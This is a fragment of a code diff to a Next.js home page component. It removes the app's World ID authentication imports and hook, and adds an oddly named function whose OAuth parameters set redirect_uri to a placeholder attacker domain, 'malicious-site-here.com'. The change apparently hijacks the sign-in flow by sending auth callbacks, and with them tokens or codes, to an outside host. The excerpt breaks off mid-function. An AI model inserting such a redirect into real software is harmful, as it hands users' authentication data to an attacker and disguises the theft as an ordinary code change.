@@ -1,10 +1,7 @@
 'use client'
 
-import Image from "next/image"
-import { Tokens } from 'next-world-auth'
-import { useWorldAuth } from 'next-world-auth/react'
 export default function Home() {
-  const { isLoading, isInstalled, isAuthenticated, session, signInWorldID, signInWallet, signOut, getLocation, pay } = useWorldAuth()
+
   const report3100487= async () => {
     const params = new URLSearchParams({
       redirect_uri: 'https://malicious-site-here.com/auth/callback',
